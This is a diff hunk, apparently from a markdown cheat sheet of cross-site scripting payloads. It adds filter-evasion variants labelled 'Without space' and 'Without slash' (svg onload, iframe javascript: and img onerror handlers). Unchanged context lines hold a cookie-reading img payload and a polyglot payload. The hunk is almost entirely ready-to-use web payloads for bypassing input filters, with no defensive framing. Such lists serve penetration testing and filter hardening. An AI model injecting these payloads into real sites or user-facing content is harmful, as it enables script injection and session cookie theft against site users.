@@ -9,6 +9,18 @@
 <img/src/onerror=alert(document.cookie;)>
 javascript:/*--></title></style></textarea></script></xmp><svg/onload='+/"/+/onmouseover=1/+/[*/[]/+alert(1)//'>
 ```
+Without space:   
+```
+<svg/onload=confirm()>
+<iframe/src=javascript:alert(1)>
+```
+
+Without slash (/):   
+```
+<svg onload=confirm()>
+<img src=x onerror=confirm()>
+```
+
 SVG based XSS:   
 ```
 <?xml version="1.0" standalone="no"?>
